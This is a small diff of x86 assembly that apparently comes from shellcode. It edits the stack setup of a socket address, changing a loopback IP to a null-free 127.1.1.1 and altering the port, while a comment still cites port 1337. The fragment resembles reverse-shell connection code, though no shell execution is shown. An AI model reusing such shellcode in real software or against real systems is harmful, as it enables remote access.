@@ -34,9 +34,9 @@ main:
     
     push esi
  ;   push byte 0x31
-	push 0x2e302e30     ; 127.0.0.1  , 0.0.0.0
-	push 0x2e373231
-    push word 0x3905  ;1337=0x3905   1234=04d2
+;	push 0x2e302e30     ; 127.0.0.1  , 0.0.0.0
+	push  0x0101017f
+    push word 0x3a05  ;1337=0x3905   1234=04d2
     push word 2
     mov ecx,esp 
     push 16 
